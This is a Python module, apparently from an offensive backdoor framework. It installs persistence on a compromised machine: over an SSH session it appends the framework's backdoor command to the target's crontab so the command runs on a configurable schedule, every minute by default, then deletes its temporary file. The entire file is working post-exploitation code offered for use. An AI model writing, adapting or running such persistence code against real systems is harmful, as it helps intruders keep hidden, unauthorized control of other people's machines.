from module import *

class Cron(Module):
    
    def __init__(self, target, backdoor, core):
        self.core = core
        self.target = target
        self.name = "Cron"
        self.backdoor = backdoor
        self.options = {
                "frequency": Option("frequency", "* * * * *", "how often to run command", False),
                }
    
    def exploit(self):
        frequency = self.get_value("frequency")
        self.target.ssh.exec_command("crontab -l > mycron")
        self.target.ssh.exec_command("echo \"" + frequency + " " + self.backdoor.get_command() + "\" >> mycron && crontab mycron && rm mycron")
        print(GOOD + self.name + " module success")
